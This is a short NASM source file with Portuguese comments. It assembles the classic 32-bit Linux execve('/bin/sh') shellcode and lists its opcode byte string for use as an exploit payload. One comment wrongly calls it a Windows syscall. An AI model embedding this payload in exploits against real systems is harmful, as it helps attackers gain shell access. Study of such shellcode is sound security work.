BITS 32
; nasm -f elf execve.asm
; ld -o execve execve.o
; ./execve
; exit
; od2sc execve
;Opecodes "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
; execve("/bin/sh",shell,NULL)
; syscall windows 86 bit 
xor eax,eax
cdq                     ; xor edx,edx 
mov byte al,11          ; system call número 
push edx                ; \0
push long 0x68732f2f    ; hs// little endian :D 
push long 0x6e69622f    ; nib/
mov ebx,esp             ; primeiro parâmentro 
push edx
mov edx,esp             
push ebx
mov ecx,esp             
int 0x80                ; system call
